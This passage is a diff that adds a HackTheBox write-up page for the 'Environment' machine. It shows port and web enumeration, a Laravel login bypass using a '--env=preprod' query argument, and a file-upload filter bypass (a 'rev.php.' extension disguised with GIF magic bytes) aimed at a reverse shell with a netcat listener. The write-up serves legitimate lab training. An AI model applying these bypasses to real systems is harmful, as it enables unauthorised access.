@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="preload" href="/assets/fonts/oxanium-variable.ttf" as="font" type="font/ttf" crossorigin />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    
+    
+    <meta name="author" content="Gianluca Bassani" />
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    <!-- Single Page App redirect receiver for GitHub Pages -->
+    <script type="text/javascript">
+      (function(l) {
+        if (l.search[1] === '/' ) {
+          var decoded = l.search.slice(1).split('&').map(function(s) { 
+            return s.replace(/~and~/g, '&')
+          }).join('?');
+          window.history.replaceState(null, null,
+              l.pathname.slice(0, -1) + decoded + l.hash
+          );
+        }
+      }(window.location))
+    </script>
+    <script type="module" crossorigin src="/assets/index-Bt1iUacl.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFjX5Hv_.css">
+  
+    <link rel="stylesheet" href="/assets/ArticlePage-BEHUn5zE.css" />
+    <title>Environment | Gianluca Bassani</title>
+    <meta name="description" content="Laravel application with login bypass, file upload vulnerability, and privilege escalation via BASH_ENV exploitation." />
+    <link rel="canonical" href="https://gianlucabassani.gitlab.io/boxes/hackthebox/environment/" />
+    <meta property="og:title" content="Environment | Gianluca Bassani" />
+    <meta property="og:description" content="Laravel application with login bypass, file upload vulnerability, and privilege escalation via BASH_ENV exploitation." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://gianlucabassani.gitlab.io/boxes/hackthebox/environment/" />
+    <meta property="og:site_name" content="Gianluca Bassani" />
+    <meta property="og:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-environment.png" />
+    <meta property="og:image:alt" content="Environment | Gianluca Bassani" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="article:published_time" content="2024-08-31" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Environment | Gianluca Bassani" />
+    <meta name="twitter:description" content="Laravel application with login bypass, file upload vulnerability, and privilege escalation via BASH_ENV exploitation." />
+    <meta name="twitter:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-environment.png" />
+    <meta name="twitter:image:alt" content="Environment | Gianluca Bassani" />
+</head>
+
+  <body>
+    <div id="root"><a class="skip-link" href="#route-content">Skip to content</a><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><header class="site-navigation"><svg class="site-navigation-frame site-navigation-frame-desktop" viewBox="0 0 1200 88" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M20 1H1167L1199 25V69H440L422 87H1V20Z"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><svg class="site-navigation-frame site-navigation-frame-mobile" viewBox="0 0 400 82" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M10 1H389L399 11V73L391 81H1V10Z"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><div class="site-navigation-inner"><a class="site-brand" aria-label="Gianluca Bassani home" href="/"><span class="site-brand-copy"><span class="site-brand-name">Gianluca<span class="site-brand-break"><br/></span> Bassani</span><small><strong>0xPr1m3</strong><span class="site-brand-separator" aria-hidden="true">·</span><span class="site-brand-role">Cybersecurity</span></small></span></a><button class="site-menu-toggle" type="button" aria-controls="site-menu" aria-expanded="false" aria-label="Open navigation"><svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><nav id="site-menu" aria-label="Main navigation" class="site-menu"><a href="/about">About Me</a><a href="/projects">Projects</a><a href="/blog">Blog</a><a aria-current="page" href="/boxes">Box Writeups</a><a href="/ctf">CTF Solves</a><a href="/skills">Skills</a><a class="site-console-link" href="/terminal">CLI <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right" aria-hidden="true"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></nav></div></header><div id="route-content" tabindex="-1"><!--$--><div class="min-h-screen bg-background cyber-grid reader-page relative"><div aria-hidden="true" class="page-ambient page-ambient-scattered" style="--ambient-primary:hsl(152,75%,52%);--ambient-secondary:hsl(185,95%,48%);--ambient-tertiary:hsl(152,75%,52%)"></div><div class="fixed top-0 left-0 w-full h-1 bg-muted z-50"><div class="h-full transition-all duration-100" style="width:0%;background-image:var(--gradient-green)"></div></div><div class="bg-background/80 backdrop-blur-md border-b border-border relative z-10"><div class="reader-header mx-auto px-4 py-4"><div class="article-navigation"><nav aria-label="Article navigation"><a class="site-button inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 site-button-outline min-h-11 px-4 py-2 article-back-link" data-size="default" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Home</a></nav><div class="article-reading-tools"><span><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2<!-- --> min read</span><button type="button"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Copy link</button><span role="status"></span></div></div><div class="flex flex-wrap items-center gap-x-4 gap-y-2 mb-4"><div class="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 hover:bg-secondary/15 tag bg-warning/20 border-warning/40 text-warning">MEDIUM</div><img class="machine-icon" src="/assets/htb/environment.png" alt="Environment machine icon" width="48" height="48"/><span class="text-sm text-muted-foreground font-mono">HACKTHEBOX</span></div><h1 class="text-2xl sm:text-3xl font-display font-bold reader-title mb-2 tracking-tight">Environment</h1><div class="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-muted-foreground"><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar w-4 h-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>31 Aug 2024</div><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-4 h-4"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>linux<!-- --> machine</div></div></div></div><main id="main-content" class="reader-layout reader-container mx-auto relative z-10 " tabindex="-1"><aside class="reader-sidebar"><div class="reader-toc reader-toc-desktop"><p>On this page</p><nav aria-label="Article chapters"><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-scan" class="reader-toc-subsection">TCP Scan</a><a href="#section-2-web-enumeration" class="">2. Web Enumeration</a><a href="#section-manual-enumeration" class="reader-toc-subsection">Manual Enumeration</a><a href="#section-automated-audit-not-relevant-for-exploitation" class="reader-toc-subsection">Automated Audit (Not Relevant for Exploitation)</a><a href="#section-3-exploitation" class="">3. Exploitation</a><a href="#section-login-page-csrf" class="reader-toc-subsection">Login Page / CSRF</a><a href="#section-bypass-login" class="reader-toc-subsection">Bypass Login</a><a href="#section-file-upload-reverse-shell" class="reader-toc-subsection">File Upload (Reverse Shell)</a><a href="#section-user-shell-hish" class="reader-toc-subsection">User Shell (hish)</a><a href="#section-keyvault-decryption" class="reader-toc-subsection">KeyVault Decryption</a><a href="#section-privilege-escalation" class="reader-toc-subsection">Privilege Escalation</a><a href="#section-conclusions" class="">Conclusions</a></nav></div><details class="reader-toc reader-toc-mobile"><summary>On this page <span>13<!-- --> chapters</span></summary><nav aria-label="Article chapters"><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-scan" class="reader-toc-subsection">TCP Scan</a><a href="#section-2-web-enumeration" class="">2. Web Enumeration</a><a href="#section-manual-enumeration" class="reader-toc-subsection">Manual Enumeration</a><a href="#section-automated-audit-not-relevant-for-exploitation" class="reader-toc-subsection">Automated Audit (Not Relevant for Exploitation)</a><a href="#section-3-exploitation" class="">3. Exploitation</a><a href="#section-login-page-csrf" class="reader-toc-subsection">Login Page / CSRF</a><a href="#section-bypass-login" class="reader-toc-subsection">Bypass Login</a><a href="#section-file-upload-reverse-shell" class="reader-toc-subsection">File Upload (Reverse Shell)</a><a href="#section-user-shell-hish" class="reader-toc-subsection">User Shell (hish)</a><a href="#section-keyvault-decryption" class="reader-toc-subsection">KeyVault Decryption</a><a href="#section-privilege-escalation" class="reader-toc-subsection">Privilege Escalation</a><a href="#section-conclusions" class="">Conclusions</a></nav></details></aside><div class="reader-body"><section class="reader-summary" aria-label="Article introduction"><p class="reader-summary-text">Laravel application with login bypass, file upload vulnerability, and privilege escalation via BASH_ENV exploitation.</p><ul class="reader-summary-topics" aria-label="Topics"><li>Laravel</li><li>Nginx</li><li>File Upload</li><li>BASH_ENV</li><li>PGP</li></ul></section><div style="--hover-theme:var(--theme-green)" class="rounded-lg border bg-card text-card-foreground shadow-sm relative overflow-hidden reader-article theme-green border-success/20"><div class="p-6 pt-0 reader-content"><div class="prose prose-invert prose-green reader-prose"><h2 id="section-1-external-enumeration"><a href="#section-1-external-enumeration" class="heading-link">1. External Enumeration</a></h2>
+<h3 id="section-tcp-scan"><a href="#section-tcp-scan" class="heading-link">TCP Scan</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">nmap -sV -sC -Pn -p- --min-rate=1000 -n -oN env_fullscan.txt 10.10.11.67
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey:
+|   256 5c:02:33:95:ef:44:e2:80:<span class="hljs-built_in">cd</span>:3a:96:02:23:f1:92:64 (ECDSA)
+|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-title: Did not follow redirect to http://environment.htb
+|_http-server-header: nginx/1.22.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<hr/>
+<h2 id="section-2-web-enumeration"><a href="#section-2-web-enumeration" class="heading-link">2. Web Enumeration</a></h2>
+<h3 id="section-manual-enumeration"><a href="#section-manual-enumeration" class="heading-link">Manual Enumeration</a></h3>
+<h4 id="section-whatweb"><a href="#section-whatweb" class="heading-link">WhatWeb</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">whatweb environment.htb
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">http://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]
+</code></pre></div>
+<h4 id="section-dirb-folder-enumeration"><a href="#section-dirb-folder-enumeration" class="heading-link">Dirb (Folder Enumeration)</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">dirb http://environment.htb
+</code></pre></div>
+<p>Found directories:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">/build/
+/build/assets/
+/storage/
+/storage/files/
+/vendor/
+/login
+/logout
+/mailing
+/up
+/upload
+/robots.txt
+/favicon.ico
+/index.php
+</code></pre></div>
+<h4 id="section-ffuf-subdomain-enumeration"><a href="#section-ffuf-subdomain-enumeration" class="heading-link">FFUF (Subdomain Enumeration)</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ffuf -u http://10.10.11.67/ -H <span class="hljs-string">&quot;Host: FUZZ.environment.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/ains-top1million-110000.txt -fs 169
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code># No findings
+</code></pre></div>
+<hr/>
+<h3 id="section-automated-audit-not-relevant-for-exploitation"><a href="#section-automated-audit-not-relevant-for-exploitation" class="heading-link">Automated Audit (Not Relevant for Exploitation)</a></h3>
+<p>Those scans reported minor issues like missing HttpOnly flags, inode leaks in robots.txt, and a client-side desync vulnerability.<br/>
+<!-- -->These findings were not used in the exploitation chain of this box, but I include them here as part of a complete enumeration methodology.</p>
+<h4 id="section-nikto"><a href="#section-nikto" class="heading-link">Nikto</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">nikto -h http://environment.htb -Tuning x -Display V -o env_nikto.txt
+</code></pre></div>
+<p>Main results:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>+ GET /: Cookie XSRF-TOKEN created without the httponly flag
++ GET /: Uncommon header &#x27;x-content-type-options&#x27; found, with contents: nosniff
++ GET /: Uncommon header &#x27;x-frame-options&#x27; found, with contents: SAMEORIGIN
++ GET /robots.txt: Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x678300c0 0x18
++ GET /robots.txt: &quot;robots.txt&quot; retrieved but it does not contain any &#x27;disallow&#x27; entries (which is odd).
++ -3092: GET /login/: /login/: This might be interesting...
+</code></pre></div>
+<h4 id="section-burp-crawler-audit"><a href="#section-burp-crawler-audit" class="heading-link">Burp Crawler &amp; Audit</a></h4>
+<ul>
+<li>
+<p>Vulnerabilities: <strong>Client-side desync</strong> via <code>/robots.txt</code></p>
+</li>
+<li>
+<p>Description: POST smuggling, browser interprets the next request.</p>
+</li>
+<li>
+<p>Remediation: patch the server, close the connection properly or use HTTP/2.</p>
+</li>
+<li>
+<p>References: <a href="https://portswigger.net/web-security/request-smuggling">HTTP Request Smuggling</a></p>
+</li>
+</ul>
+<hr/>
+<h2 id="section-3-exploitation"><a href="#section-3-exploitation" class="heading-link">3. Exploitation</a></h2>
+<h3 id="section-login-page-csrf"><a href="#section-login-page-csrf" class="heading-link">Login Page / CSRF</a></h3>
+<p>Testing the parameters in the login we discovered that the &quot;remember&quot; parameter makes the app expose its source code:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>POST /login HTTP/1.1
+Host: environment.htb
+...
+_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF&amp;email=test%40c.com&amp;password=test&amp;remember=FUZZED
+</code></pre></div>
+<ul>
+<li>
+<p>All POST requests in Laravel require a <strong>CSRF token</strong> (<code>_token</code>)</p>
+</li>
+<li>
+<p>POST without token → 419 Page Expired</p>
+</li>
+<li>
+<p>Token regenerated on every failed request</p>
+</li>
+<li>
+<p><code>remember</code> parameter can expose source code</p>
+</li>
+</ul>
+<h3 id="section-bypass-login"><a href="#section-bypass-login" class="heading-link">Bypass Login</a></h3>
+<p>We found that the <code>preprod</code> environment variable allows direct login.</p>
+<p>With interception enabled, we can bypass login using the following request:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>http</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="http block, horizontally scrollable"><code class="hljs language-http">POST /login?--env=preprod HTTP/1.1
+Host: environment.htb
+...
+_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF&amp;email=test%40c.com&amp;password=test&amp;remember=True
+</code></pre></div>
+<p>Accessed: <code>http://environment.htb/management/dashboard</code></p>
+<hr/>
+<h3 id="section-file-upload-reverse-shell"><a href="#section-file-upload-reverse-shell" class="heading-link">File Upload (Reverse Shell)</a></h3>
+<ul>
+<li>
+<p>Endpoint: <code>/management/profile</code></p>
+</li>
+<li>
+<p>Bypass image restrictions:</p>
+</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>Estensione: rev.php.
+Content-Type: image/gif
+Magic bytes: GIF89a
+</code></pre></div>
+<p>Listener:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">nc -nvlp 1234
+</code></pre></div>
+<hr/>
+<h3 id="section-user-shell-hish"><a href="#section-user-shell-hish" class="heading-link">User Shell (hish)</a></h3>
